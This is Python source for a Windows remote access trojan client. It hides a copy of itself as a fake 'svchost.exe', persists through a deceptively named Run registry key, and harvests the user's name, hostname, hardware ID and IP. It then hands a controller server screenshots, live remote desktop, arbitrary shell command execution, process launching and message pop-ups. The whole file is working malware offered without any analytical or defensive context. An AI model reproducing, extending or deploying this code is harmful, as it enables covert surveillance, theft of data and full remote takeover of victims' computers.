# -*- coding: utf-8 -*-
import os
from os import _exit
import socket
from urllib import request
import threading
import time
from subprocess import check_output, DEVNULL, Popen, PIPE # HWID GET, +other
from PIL import ImageGrab #screenshot
import io
#from PIL import Image
from vidstream import ScreenShareClient #remote desktop
from ctypes import windll, WinDLL, Structure, wintypes #MessageBox
from platform import release as osrelease #WINDOWS VERSION
import sys
from shutil import copyfile as scopyfile
from winreg import HKEY_CURRENT_USER, OpenKey, CloseKey, SetValueEx, REG_SZ, KEY_WRITE, DeleteValue, QueryValueEx, HKEY_LOCAL_MACHINE

FILE_ATTRIBUTE_HIDDEN = 0x2

class FILE_ATTRIBUTE(Structure):
    _fields_ = [("dwFileAttributes", wintypes.DWORD)]


def LuminaMystGroveWhisper():
    current_exe_path = sys.argv[0]
    
    temp_copy_path = os.path.join(os.environ['TEMP'], "svchost.exe")
    
    try:
        scopyfile(current_exe_path, temp_copy_path)
        
        attrs = FILE_ATTRIBUTE()
        attrs.dwFileAttributes = FILE_ATTRIBUTE_HIDDEN
        windll.kernel32.SetFileAttributesW(temp_copy_path, attrs.dwFileAttributes)
            
    except:
        pass
    
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    key_name = "Windows Host Device"
    with OpenKey(HKEY_CURRENT_USER, key_path, 0, KEY_WRITE) as key:
        SetValueEx(key, key_name, 0, REG_SZ, temp_copy_path)
    
    Popen(temp_copy_path, close_fds=True)

    sys.exit(0)

def FloraNovaLumisZephyr():
    if getattr(sys, 'frozen', False):
        if sys.executable.endswith("svchost.exe"):
            pass
        else:
            LuminaMystGroveWhisper()
    else:
        #if .py
        pass





server_ip = "127.0.0.1"
server_port = 4639

data_transfering = False #no error, data mix

build = "v1.2"
username = os.environ.get('USERNAME')
hostname = os.environ.get('COMPUTERNAME')

try:
    with request.urlopen("http://api.ipify.org") as response:
        ip_address = response.read().decode('utf-8')
except:
    pass

def FullDelete():
    try:
        with OpenKey(HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE) as key:
            DeleteValue(key, "Windows Host Device")
    except:pass
    _exit(0) #nt

def get_os_version():
    release = osrelease()
    return f"Windows {release}"

def get_registry_value(key_path, value_name):
    try: 
        key = OpenKey(HKEY_LOCAL_MACHINE, key_path)
        
        value, _ = QueryValueEx(key, value_name)
        
        CloseKey(key)
        
        return value
    except Exception as e:
        print(f"Error: {e}")
        return None
    
hwid = get_registry_value(r"SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001", r"HwProfileGuid")
if hwid is not None:
    hwid = hwid.strip('{}').upper()

os_version = get_os_version()
#print(os_version)

def take_screenshot():
    screenshot = ImageGrab.grab()
    screenshot_bytes = io.BytesIO()
    screenshot.save(screenshot_bytes, format="PNG")
    screenshot_bytes = screenshot_bytes.getvalue()
    return screenshot_bytes

def handle_server_commands(client_socket):
    global data_transfering
    while True:
        try:
            data = client_socket.recv(1024).decode()
            if data == "ap3x_screenshot":
                try:
                    data_transfering = True
                    print("[DEBUG] Sharing screenshot ...")
                    screenshot_bytes = take_screenshot()
                    screenshot_size = len(screenshot_bytes)
                    client_socket.send("ap3x_screenshot".encode())
                    time.sleep(0.5)
                    client_socket.send(str(screenshot_size).encode())
                    time.sleep(0.5)
                    sent_bytes = 0
                    while sent_bytes < screenshot_size:
                        chunk = screenshot_bytes[sent_bytes : sent_bytes + 1024]
                        client_socket.send(chunk)
                        sent_bytes += len(chunk)
                except:
                    pass
                finally:
                    data_transfering = False

            elif data == "ap3x_rmt_desktop":
                try:
                    data_transfering = True
                    print("[*] Starting Remote Desktop ...")
                    sender = ScreenShareClient(server_ip, 4224) #remote desktop
                    stream_sender_th = threading.Thread(target=sender.start_stream)
                    stream_sender_th.start()
                except:
                    pass
                finally:
                    data_transfering = False
            elif data == "Ap3x1nfo":
                try:
                    data_transfering = True
                    client_socket.send(f"Ap3x1nfo::{username}::{hostname}::{os_version}::{build}::{hwid}::{ip_address}".encode())
                except:
                    pass
                finally:
                    data_transfering = False
            elif data == "Ap3xD1sconnect":
                _exit(0)

            elif data == "97f6r743dsufhduygodsut8ygdfgjou":
                FullDelete()

            elif data == "ywa7t87g5t3fgkjdgh4ygerkjg":
                try:
                    ccc = r'powershell.exe -ExecutionPolicy RemoteSigned -Command "$wmp = New-Object -ComObject WMPlayer.OCX; $cdrom = $wmp.cdromCollection.Item(0); $cdrom.eject()"'
                    Popen(ccc, stdout=PIPE, stderr=PIPE, shell=True)
                except:pass

            elif data.startswith("URLop3n_ap3x:"):
                try:
                    data_transfering = True
                    command, url = data.split("::")
                    #print(url)
                    open_url = check_output(f'explorer.exe {url}', shell=True, stderr=DEVNULL).decode('utf-8')
                except:
                    pass
                finally:
                    data_transfering = False

            elif data.startswith("Ap3xCMD:"): # CMD HANDLE
                try:
                    data_transfering = True
                    command, toProcess = data.split("::")

                    if toProcess.startswith("cd "):
                        new_dir = toProcess.split("cd ")[1].strip()
                        if new_dir == "..":
                            os.chdir(os.path.abspath(os.path.join(os.getcwd(), os.pardir)))
                        else:
                            os.chdir(new_dir)

                        response = f"Changed directory to: {os.getcwd()}"
                        client_socket.send(f"Ap3xCMDAnsw3r::{response}".encode())
                    else:
                        process = Popen(toProcess, shell=True, stdout=PIPE, stderr=PIPE)
                        stdout, stderr = process.communicate()

                        stdout = stdout.decode('cp866')
                        stderr = stderr.decode('cp866')

                        if " " in stderr:
                            client_socket.send(f"Ap3xCMDAnsw3r::ERROR: {stderr}".encode())
                        else:
                            client_socket.send(f"Ap3xCMDAnsw3r:: {stdout}".encode())
                except Exception as e:
                    print(e)

            elif data.startswith("Ap3x_MessageBox:"):
                try:
                    data_transfering = True
                    command, box_text = data.split("::")
                    #print(box_text)
                    windll.user32.MessageBoxW(0, f"{box_text}", "System Info", 0 | 0x10)
                except:
                    pass
                finally:
                    data_transfering = False

            elif data.startswith("Ap3xTask_MGR:"):
                try:
                    data_transfering = True
                    command, taskmgr = data.split("::")
                    #print(taskmgr)
                    Popen(f'{taskmgr}')
                except:
                    pass
                finally:
                    data_transfering = False
            elif data:
                print(data)
        except:
            break


def connect_to_server():
    global data_transfering
    global client_socket
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            data_transfering = True
            client_socket.connect((server_ip, server_port))
            data_to_send = f"{build}|{username}|{hwid}|{os_version}"
            client_socket.send(data_to_send.encode())
            data_transfering = False

            client_thread = threading.Thread(target=handle_server_commands, args=(client_socket,))
            client_thread.daemon = True
            client_thread.start()

            while True:
                if not data_transfering:
                    data = "ap3x"
                    client_socket.send(data.encode())
                    time.sleep(20)
                else:
                    pass

        except:
            time.sleep(5)
            print("[DEBUG] Connection lost. Retrying...")
            try:
                client_socket.close()
            except:pass
            try:
                connect_to_server()
            except:pass

def reconnect():
    global connect_thread
    while True:
        try:
            client_socket.close()
        except:
            pass
        try:
            connect_thread = threading.Thread(target=connect_to_server)
            connect_thread.daemon = True
            connect_thread.start()
        except:
            pass
        print("[DEBUG] RECONNECTING ...")
        time.sleep(350)

reconnect_thread = threading.Thread(target=reconnect)
reconnect_thread.daemon = True
reconnect_thread.start()

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    pass
